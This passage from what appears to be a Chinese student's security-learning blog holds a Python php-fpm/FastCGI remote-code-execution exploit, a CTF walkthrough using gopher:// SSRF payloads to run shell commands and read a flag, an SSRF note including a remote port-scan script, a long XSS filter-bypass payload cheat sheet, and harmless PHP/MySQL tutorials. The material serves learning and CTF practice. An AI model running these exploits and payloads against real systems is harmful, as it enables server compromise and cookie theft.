&#x3D; b&quot;&quot; beginFCGIRecordContent &#x3D; bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord &#x3D; b&#39;&#39; if nameValuePairs: for (name, value) in nameValuePairs.items(): name &#x3D; force_bytes(name) value &#x3D; force_bytes(value) paramsRecord +&#x3D; self.__encodeNameValueParams(name, value) if paramsRecord: request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId) if post: request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId) self.sock.send(request) self.requests[requestId][&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#39;response&#39;] &#x3D; b&#39;&#39; return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data &#x3D; b&#39;&#39; while True: buf &#x3D; self.sock.recv(512) if not len(buf): break data +&#x3D; buf data &#x3D; BytesIO(data) while True: response &#x3D; self.__decodeFastCGIRecord(data) if not response: break if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR: if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_ERROR if requestId &#x3D;&#x3D; int(response[&#39;requestId&#39;]): self.requests[requestId][&#39;response&#39;] +&#x3D; response[&#39;content&#39;] if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#39;response&#39;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Php-fpm code execution vulnerability client.&#39;) parser.add_argument(&#39;host&#39;, help&#x3D;&#39;Target host, such as 127.0.0.1&#39;) parser.add_argument(&#39;file&#39;, help&#x3D;&#39;A php file absolute path, such as &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;System.php&#39;) parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, help&#x3D;&#39;What php code your want to execute&#39;, default&#x3D;&#39;&lt;?php phpinfo(); exit; ?&gt;&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help&#x3D;&#39;FastCGI port&#39;, default&#x3D;9000, type&#x3D;int) args &#x3D; parser.parse_args() client &#x3D; FastCGIClient(args.host, args.port, 3, 0) params &#x3D; dict() documentRoot &#x3D; &quot;&#x2F;&quot; uri &#x3D; args.file content &#x3D; args.code params &#x3D; &#123; &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;POST&#39;, &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;&#x2F;&#39;), &#39;SCRIPT_NAME&#39;: uri, &#39;QUERY_STRING&#39;: &#39;&#39;, &#39;REQUEST_URI&#39;: uri, &#39;DOCUMENT_ROOT&#39;: documentRoot, &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;9985&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;, &#39;CONTENT_TYPE&#39;: &#39;application&#x2F;text&#39;, &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(content), &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;, &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39; &#125; response &#x3D; client.request(params, content) 执行命令： 1python2 exp.py -c &quot;&lt;?php var_dump(shell_exec(&#39;ls &#x2F;&#39;));?&gt;&quot; -p 9000 127.0.0.1 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php 运行报错，不过没有关系。 hexdump 1.txt, 十六进制输出 123456789101112131415161718192021222324252627282930313233343536370000000 0101 dec4 0800 0000 0100 0000 0000 00000000010 0401 dec4 e701 0000 020e 4f43 544e 4e450000020 5f54 454c 474e 4854 3733 100c 4f43 544e0000030 4e45 5f54 5954 4550 7061 6c70 6369 74610000040 6f69 2f6e 6574 7478 040b 4552 4f4d 45540000050 505f 524f 3954 3839 0b35 5309 5245 45560000060 5f52 414e 454d 6f6c 6163 686c 736f 11740000070 470b 5441 5745 5941 495f 544e 5245 41460000080 4543 6146 7473 4743 2f49 2e31 0f30 530e0000090 5245 4556 5f52 4f53 5446 4157 4552 687000000a0 2f70 6366 6967 6c63 6569 746e 090b 455200000b0 4f4d 4554 415f 4444 3152 3732 302e 302e00000c0 312e 1b0f 4353 4952 5450 465f 4c49 4e4500000d0 4d41 2f45 7375 2f72 6f6c 6163 2f6c 696c00000e0 2f62 6870 2f70 4550 5241 702e 7068 1b0b00000f0 4353 4952 5450 4e5f 4d41 2f45 7375 2f720000100 6f6c 6163 2f6c 696c 2f62 6870 2f70 45500000110 5241 702e 7068 1f09 4850 5f50 4156 554c0000120 6145 7475 5f6f 7270 7065 6e65 5f64 69660000130 656c 3d20 7020 7068 2f3a 692f 706e 74750000140 040e 4552 5551 5345 5f54 454d 4854 444f0000150 4f50 5453 020b 4553 5652 5245 505f 524f0000160 3854 0f30 5308 5245 4556 5f52 5250 544f0000170 434f 4c4f 5448 5054 312f 312e 000c 55510000180 5245 5f59 5453 4952 474e 160f 4850 5f500000190 4441 494d 5f4e 4156 554c 6145 6c6c 776f00001a0 755f 6c72 695f 636e 756c 6564 3d20 4f2000001b0 0d6e 4401 434f 4d55 4e45 5f54 4f52 544f00001c0 0b2f 5309 5245 4556 5f52 4441 5244 323100001d0 2e37 2e30 2e30 0b31 521b 5145 4555 545300001e0 555f 4952 752f 7273 6c2f 636f 6c61 6c2f00001f0 6269 702f 7068 502f 4145 2e52 6870 01700000200 c404 00de 0000 0100 c405 00de 0025 3c000000210 703f 7068 7620 7261 645f 6d75 2870 68730000220 6c65 5f6c 7865 6365 2728 736c 2f20 29270000230 3b29 3e3f 0501 dec4 0000 0000 000023c 使用脚本处理 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647a&#x3D;&#39;&#39;&#39;0101 dec4 0800 0000 0100 0000 0000 00000401 dec4 e701 0000 020e 4f43 544e 4e455f54 454c 474e 4854 3733 100c 4f43 544e4e45 5f54 5954 4550 7061 6c70 6369 74616f69 2f6e 6574 7478 040b 4552 4f4d 4554505f 524f 3954 3839 0b35 5309 5245 45565f52 414e 454d 6f6c 6163 686c 736f 1174470b 5441 5745 5941 495f 544e 5245 41464543 6146 7473 4743 2f49 2e31 0f30 530e5245 4556 5f52 4f53 5446 4157 4552 68702f70 6366 6967 6c63 6569 746e 090b 45524f4d 4554 415f 4444 3152 3732 302e 302e312e 1b0f 4353 4952 5450 465f 4c49 4e454d41 2f45 7375 2f72 6f6c 6163 2f6c 696c2f62 6870 2f70 4550 5241 702e 7068 1b0b4353 4952 5450 4e5f 4d41 2f45 7375 2f726f6c 6163 2f6c 696c 2f62 6870 2f70 45505241 702e 7068 1f09 4850 5f50 4156 554c6145 7475 5f6f 7270 7065 6e65 5f64 6966656c 3d20 7020 7068 2f3a 692f 706e 7475040e 4552 5551 5345 5f54 454d 4854 444f4f50 5453 020b 4553 5652 5245 505f 524f3854 0f30 5308 5245 4556 5f52 5250 544f434f 4c4f 5448 5054 312f 312e 000c 55515245 5f59 5453 4952 474e 160f 4850 5f504441 494d 5f4e 4156 554c 6145 6c6c 776f755f 6c72 695f 636e 756c 6564 3d20 4f200d6e 4401 434f 4d55 4e45 5f54 4f52 544f0b2f 5309 5245 4556 5f52 4441 5244 32312e37 2e30 2e30 0b31 521b 5145 4555 5453555f 4952 752f 7273 6c2f 636f 6c61 6c2f6269 702f 7068 502f 4145 2e52 6870 0170c404 00de 0000 0100 c405 00de 0025 3c00703f 7068 7620 7261 645f 6d75 2870 68736c65 5f6c 7865 6365 2728 736c 2f20 29273b29 3e3f 0501 dec4 0000 0000 &#39;&#39;&#39;a&#x3D;a.replace(&#39;\\n&#39;,&#39;&#39;)a&#x3D;a.replace(&#39; &#39;,&#39;&#39;)b&#x3D;&#39;&#39;length&#x3D;len(a)for i in range(0,length,2): b+&#x3D;&#39;%&#39; b+&#x3D;a[i] b+&#x3D;a[i+1]print(b) 运行得到URL编码，之后再次编码，然后访问。但是没有反应，不知道哪里错了。。。 工具https://github.com/tarunkant/Gopherus python gopherus.py --exploit fastcgi 如图输入。得到: 1%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%08%00%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%1BSCRIPT_FILENAME&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%0D%01DOCUMENT_ROOT&#x2F;%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20&#x2F;%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 二次编码 1%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520&#x2F;%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%251BSCRIPT_FILENAME&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%250D%2501DOCUMENT_ROOT&#x2F;%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2504%2500%253C%253Fphp%2520system%2528%2527ls%2520&#x2F;%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500 然后访问: ?url=gopher://127.0.0.1:9000/_上面编码的。执行后得到flag文件名，之后还是一样步骤，只不过命令变成了cat /flag。结果如下: 1?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520&#x2F;%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%251BSCRIPT_FILENAME&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%250D%2501DOCUMENT_ROOT&#x2F;%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520&#x2F;flag_0a92948a72a774b76015091ca424143a%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500 SSRF利用远程文件包含可以包含远程的文件，如端口扫描脚本：http://118.178.88.139/ssrf-1.txt，然后POST中加一个ip参数，值是118.178.88.139，就可以包含这个文件并执行，得到开放的端口。 SSRF与XXE看看bwapp的就好。（不知道哪设置不当，没读取到文件) SSRF未授权访问Redisroot-me的靶场上，未复现成功…","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SSRF的常见情况及绕过等","slug":"SSRF的常见情况及绕过等","permalink":"https://ggyggy666.github.io/tags/SSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E7%AD%89/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"xss的常见情况及绕过姿势","slug":"xss的常见情况及绕过姿势","date":"2020-06-21T11:10:41.000Z","updated":"2020-06-23T07:36:14.234Z","comments":true,"path":"2020/06/21/xss的常见情况及绕过姿势/","link":"","permalink":"https://ggyggy666.github.io/2020/06/21/xss%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","excerpt":"今天正式结课了，开始我的暑假生活。因此来更新一下这两天玩xss的一些总结。","text":"今天正式结课了，开始我的暑假生活。因此来更新一下这两天玩xss的一些总结。 xss，跨站脚本攻击，主要是由于用户输入恶意代码，没有什么过滤，导致浏览器当做正常的前端代码执行了而产生的。分为反射型、存储型和DOM型三种。都需要输入后输出在页面。 反射型：前端-》后端-》输出到前端。 存储型：前端-》后端-》存进数据库-》从数据库中取出-》输出到前端。 DOM型：只在前端，主要靠document.write()和innerHTML。 常见情况 没有过滤，直接上：&lt;script&gt;alert(1)&lt;/script&gt; 需要闭合标签：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;。注意也可能是单引号闭合（默认情况下htmlspecialchars()不会转义单引号）。绝对不要同时使用如：’”&gt; 过滤了&lt;和&gt;, 使用事件。onclick, onmouseover, onerror等。 如果事件也用不了，考虑伪协议：javascript:alert(1)。适合能够用src,href的标签如：a, iframe。 可以考虑大小写混合绕过。 如果删除了某些字，考虑双写。 如果是在标签的属性中的值，是可以进行实体编码的，因此可以考虑进行HTML编码。如果是在&lt;script&gt; ... &lt;/script&gt;，js中的，无法进行HTML解码，因此需要使用eval()。 有些跳转的a标签的链接需要使用包含跳转那个域名才行，可以考虑：javascript:alert(1)/*http://xxx.com*/ URL中的参数被过滤了，考虑：F12-&gt;搜索input标签，看看有没有hidden的input标签。 看看页面有没有涉及到referrer、user-Agent和cookie的，可以抓包，然后替换成payload。 ng-include可以包含同一域名下的文件，需要包含同一域名下的其它文件，且该文件需要存在反射型xss,就把那个链接作为payload。 URL中可以使用%0a, %0d等, 如果是输入框，可以手动换行。 有一些过滤 过滤了alert, 用prompt,confirm,top[&#39;alert&#39;](1)。 过滤了(), 用``。 过滤了空格，用%0a,%0d,/**/。 输入的字符全部转为转大写情况下，HTML代码仍然能正常执行，但是js不行。那么对于script, 字符ſ大写后为S,因此可以换成：ſcript。同理svg。 过滤script,使用%00截断。javascr%00ipt:alert(1)。 使用编码。如果是在script标签中，对于js的字符串可以使用Unicode编码的。因此如果\\没有被过滤， 那么可以使用：\\u0027或者\\x27。对于setTimeout这种函数，第一个值就是一个字符串，可以用Unicode编码。如果是出现在location.href中，还没弹框就重定向了，因此需要使用replace。\\u0027.replace(/.\\u002b/,/javascript:alert(document.cookie)/.source);闭合后成为一个字符串，调用replace函数将字符串值变为javascript:alert(1)。 如果是在script中的js代码，使用： ` String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)` eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41)) 标签中可以使用空格。如：。 某些场景 URL中有callback=，参数值是一个函数名。那么它肯定就是出现在js中。可以使用eval(‘alert(1)’);void 。使用void防止报错。如果callback这里不行，可以看看后面的参数。找到一个参数值输入后会解码一次的参数，输入payload，即：xxx=%26callback=eval(String.fromCharCode(xx,xx));void 这样子将前面的callback覆盖。 输出在标签的属性值中，可以使用HTML编码，但如果&amp;和#被过滤了，且输入是在URL中，可以用%26, %23代替。即&#x27; -&gt; %26%23x27; 如果使用双引号被实体编码了，不要放弃，看看：charset=gbxxx，如果是gb系列的，可以考虑宽字节。如：%df” 或者 %c0” 。 如果URL中有多个参数，并且他们的值最后会被拼接在一起，可以考虑：在第一个参数值处使用一个, 可能将一个双引号转义。在第二个参数值中：&amp;xxx==1;alert(1);function xxx(){}; js中会将后面函数的定义提前。 输入输出在注释中，使用换行符跳出注释，再用//注释后面的东西。注意，如果这个输出在注释的一个引号中作为值，换行后//又注释了闭合的引号，就会报错。那么可以先使用\\然后再换行。因为用\\就代表字符串换行了还是在一个值内，是被允许的。如： // var b=&quot;aaa\\ alert(1);//&quot;; 在URL的参数值中用一个, F12查看console中有没有报错，然后定位到相应的错误。在console中输入函数名可以看到该函数是怎么实现的。 出现在style中的background-color等样式中时，用expression(alert(‘1’)); 对于DOMxss，URL中的一个参数值后面加##再加payload是可以的。##是分割的作用，##之前的参数值是正确的会被传进去验证，后面的payload会被保存在浏览器。因此：?default=English##&lt;script&gt;alert(1)&lt;/script&gt;常见页面就是根据en或cn进行中文、英文切换。 DOMxss如果是innerHTML或者document.write()，必须用：&lt;img src=1 onerror=alert(1)&gt;。 寻找方法：首先查找有没有innerHTML,document.write，location.hash, window.name这些。然后定位到相应地方，查看其所在函数，看是否有什么过滤或者看看payload该怎么构造。 location.hash, 在URL的#后面输出。 window.name的话需要写一个HTML。 iframe标签的payload 1.1 最好懂的，onload执行js &lt;iframe on load=&quot;alert(1)&quot;&gt;&lt;/iframe&gt; 1.2 src 执行javascript代码 &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; 1.3 IE下vbscript执行代码 &lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt; 1.4 Chrome下data协议执行代码 &lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframeChrome 1.5 上面的变体 &lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; 1.6 Chrome下srcdoc属性 &lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;xss.haozi.me的题目 必须用&lt;/textarea&gt;&lt;svg/onload=alert(1)&gt;，得闭合前面的&lt;textarea&gt;。 注释符： onclick和等号之间可以换行。 如果必须以某个链接开头，那么可以用：http://xxx.com/xxx.js&quot; onerror=&quot;alert(1) xxx.js是自己乱加的，然后才能找不到从而报错，执行。 如果是出现在script标签的src中，可以调用另外一个域的js文件，并且那个文件内容只有alert(1); 如果必须包含某个域，使用@。即：http://xxx.com@xss.com/test.js 输入都变成大写了，可以使用实体编码。 注意–&gt;也是可以注释一行的。 如果出现\\转义双引号等，那么可以试试前面用一个\\，可能没有将反斜杠转义。因此反斜杠就会与转义双引号的那个反斜杠凑一块了。\\&quot;);alert(1);// 存在CSP时CSP只允许src属性加载js文件时加载同一域名下的。因此本来对于callback函数，只需要使用：?callback=alert(1);%0a//的。有了CSP之后，必须使用script标签的src属性加载payload。即：?callback=&lt;script src=&quot;?callback=alert(1);%0a//&quot;&gt;&lt;/script&gt; 直接用?callback就表示是同一域名下的了。 一道CTFhttps://vizfina.exeye.run/summa?tag=a=attrs=onfocus=alert(152)%2526id=1%2526tabindex=0#1根据读取页面的js代码来一步步构造。首先写死了一个tag参数，但是值没有写死。它的值是在等号与&amp;之间，因此如果值中要存在一个&amp;，必须再进行一次URL编码即%2526。然后等号后提取第一个字符作为标签名，因此只能用a或者p这些标签。显然应该用a标签。然后代码自己传了一个attrs进去，因此URL中也应该有attrs,而且也应该作为值，因此最好就是用等号连接：?tag=a=attrs。然后attrs又可以有值，它的值是xxx=xxx的形式，作为属性与值，这时payload变成：?tag=a=attrs=onfocus=alert(152)。但是这时的onfocus还不能准确聚焦到a标签，此时可以增加属性创建锚点以聚焦在a标签上。因此使用%2526来链接属性作为attrs的值。最后的payload：?tag=a=attrs=onfocus=alert(152)%25%26id=1%26%26tabindex=0#1。使用id=1,还有tabindex=0,最后#1来创建锚点并定位到这个a标签。 payload&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt; &lt;details open ontoggle=alert(1)&gt; &lt;body onpageshow=alert(1)&gt; &lt;marquee onstart=alert(1)&gt;hack the planet&lt;/marquee&gt; eval(&apos;~a~le~rt~~(~~1~~)~&apos;.replace(/~/g, &apos;&apos;)) (1, eval)(&apos;alert(1)&apos;) &lt;embed src=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczL**yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot;&gt;&lt;/embed&gt;更多请看：https://www.freebuf.com/articles/web/226719.htmlhttps://bbs.77169.net/forum.php?mod=viewthread&amp;tid=372573&amp;highlight=xss 参考文章：https://www.secpulse.com/archives/107727.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"xss的常见情况及绕过姿势","slug":"xss的常见情况及绕过姿势","permalink":"https://ggyggy666.github.io/tags/xss%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"PHP连接MySQL数据库操作--面向过程","slug":"PHP连接MySQL数据库操作--面向过程","date":"2020-05-19T08:12:50.000Z","updated":"2020-05-19T08:38:46.996Z","comments":true,"path":"2020/05/19/PHP连接MySQL数据库操作--面向过程/","link":"","permalink":"https://ggyggy666.github.io/2020/05/19/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C--%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/","excerpt":"今天继续学习PHP连接数据库–面向过程。","text":"今天继续学习PHP连接数据库–面向过程。 连接数据库&lt;?php $conn = mysqli_connect($servername, $username, $password, $dbname&quot;); if(mysqli_connect_error($conn)){ echo &quot;连接失败：&quot;.mysqli_connect_error(); } mysqli_close($conn); ?&gt;创建数据库在没有数据库之前，连接数据库就不用加上dbname，然后先连接上后再创建数据库。 $conn = mysqli_connect($servername, $username, $password); ... $sql = &quot;create database ggy&quot;; if(mysqli_query($conn, $sql)){...} //执行SQL语句 else echo &quot;error: &quot;.mysqli_error(); //输出错误选择使用某数据库$conn = ... 创建一个数据库后 mysqli_select_db($conn, &quot;ggy&quot;); //相当于use ggy创建表、插入、删除、更新其实也就是SQL语句变了而已。只要记住： 1. mysqli_select_db($conn,&quot;ggy&quot;) //先选择数据库 2. mysqli_query($conn, $sql) //再执行SQL语句 3. mysqli_error() //出错就报错查询数据库跟面向对象一样，查询到的数据是按行记录的，然后每一行都可以用一个函数将其构造成一个关联数组，然后while循环就行了。 $result = mysqli_query($conn, &quot;select * from ggy&quot;); while($row = mysqli_fetch_array($result)){ echo $row[&apos;username&apos;].$row[&apos;password&apos;]; }之后，条件查询和order by也就是SQL语句变换一下而已。","categories":[{"name":"PHP学习","slug":"PHP学习","permalink":"https://ggyggy666.github.io/categories/PHP%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP连接MySQL数据库操作--面向过程","slug":"PHP连接MySQL数据库操作-面向过程","permalink":"https://ggyggy666.github.io/tags/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/"}],"keywords":[{"name":"PHP学习","slug":"PHP学习","permalink":"https://ggyggy666.github.io/categories/PHP%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP连接MySQL数据库操作--面向对象","slug":"PHP连接MySQL数据库操作--面向对象","date":"2020-05-18T14:01:16.000Z","updated":"2020-05-19T08:41:25.108Z","comments":true,"path":"2020/05/18/PHP连接MySQL数据库操作--面向对象/","link":"","permalink":"https://ggyggy666.github.io/2020/05/18/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C--%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","excerpt":"好久没更新了，最近忙于学习PHP。学会了如何连接数据库，在此总结一下。","text":"好久没更新了，最近忙于学习PHP。学会了如何连接数据库，在此总结一下。 连接MySQL数据库有面向对象和面向过程两种。本篇是面向对象。 创建连接&lt;?php $servername = &quot;localhost&quot;; //数据库所在地址，本地搭建的因此是localhost或者127.0.0.1 $username = &quot;username&quot;; //数据库用户名 $password = &quot;password&quot;; //数据库密码 $conn = new mysqli($servername, $username, $password); //创建连接 if($conn-&gt;connect_error){ die(&quot;连接失败：&quot;.$conn-&gt;connect_error); //die终止连接并抛出错误信息 } echo &quot;连接成功&quot;; $conn-&gt;close(); //手动关闭连接 ?&gt;创建数据库接上面的连接数据库后，可以创建一个数据库。 $sql = &quot;create database ggy&quot;; if($conn-&gt;query($sql) === true){ echo &quot;数据库创建成功&quot;; }else{ echo &quot;Error creating database: &quot;.$conn-&gt;error; }$conn-&gt;query()是执行里面的SQL语句并返回true或者false。 创建数据表要创建表，首先得指定是在哪个数据库之下，即：use ggy。表明使用ggy这个数据库。面向对象的话在创建连接的时候就可以传数据库名称进去（前提是知道这个数据库名称). 如下： $dbname = &quot;ggy&quot;; $conn = new mysqli($servername, $username, $password, $dbname); ... $sql = &quot;create table ggy_table( id int(6) unsigned auto_increment primary key, username varchar(30) not null, password varchar(30) not null)&quot;; $conn-&gt;query($sql);注意，创建表时里面的字段要指定类型以及长度。auto_increment是当新增一条记录时，id能自动加1. 还要设定主键，其它字段如果是必需的就得使用not null。 插入数据$sql = &quot;insert into ggy_table(username, password) values (&apos;ggy&apos;, 666)&quot;; $conn-&gt;query($sql);看到这里就知道了，其实在连接上数据库后，就是使用SQL语句，然后使用$conn-&gt;query($sql)执行就可以了。 插入多条数据其实就是使用了堆叠查询的原理。 $sql = &quot;insert into ggy_table(username, password) values (&apos;ggy&apos;,&apos;ggy&apos;);&quot;; //SQL语句后有分号 $sql .= &quot;insert into ggy_table(username, password) values (&apos;ggg&apos;, &apos;handsome&apos;)&quot;; $conn-&gt;query($sql);使用分号隔离每个SQL语句，使用.连接起来，然后再一次执行即可。这样的话需要写很多行，而且要写很多重复的代码，也可以这样写： $sql = &quot;insert into ggy_table(username, password) values (&apos;ggy&apos;,&apos;666&apos;),(&apos;fff&apos;,&apos;admin&apos;)&quot;;只需要将插入的数据用括号括起来，相互之间用逗号分隔即可。 读取数据使用select查询出数据，然后使用fetch_assoc()将这些数据按每一行记录来作为一个关联数组，然后就可以通过数组名键来访问值了。 $sql = &quot;select id, username, password from ggy_table&quot;; $result = $conn-&gt;query($sql); //查询到的多条数据赋值给result if($result-&gt;num_rows &gt; 0){ //因为记录是按行的，因此通过判断它的行数来判断查到的数据是否为空。 while($row = $result-&gt;fetch_assoc()){ echo $row[&quot;id&quot;].$row[&quot;username&quot;].$row[&quot;password&quot;]; } }使用了一个while循环，会使每次调用fetch_assoc()之后相当于遍历每一行查到的数据，然后将该行记录变为一个关联数组。 where条件、order by排序查询$sql = &quot;select * from ggy_table where username=&apos;ggy&apos;&quot;; $result = $conn-&gt;query($sql); ...与上面select的一样，排序的话就是在SQL语句后面直接加order by xx ，默认是升序，要降序的话，后面加DESC。 更新数据$sql = &quot;update ggy_table set username=&apos;ggy666&apos; where username=&apos;ggy&apos;&quot;; $conn-&gt;query($sql);将用户名为ggy的所有记录的用户名都更改为ggy666. 删除数据使用delete删除的是表中的某些记录。 $sql = &quot;delete from ggy_table where username=&apos;ggy&apos;&quot;; $conn-&gt;query($sql);删除ggy_table中所有用户名为ggy的记录。 预处理语句使用预处理语句可以有效防止SQL注入。因为预处理语句对用户的输入都不会当做SQL语句执行，而是直接输出。 //sql连接后 $stmt = $conn-&gt;prepare(&quot;insert into ggy_table(username, password) values (?,?); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); //上面只是预备好插入的SQL语句，值都是？。然后绑定就是将之后传入的$username, 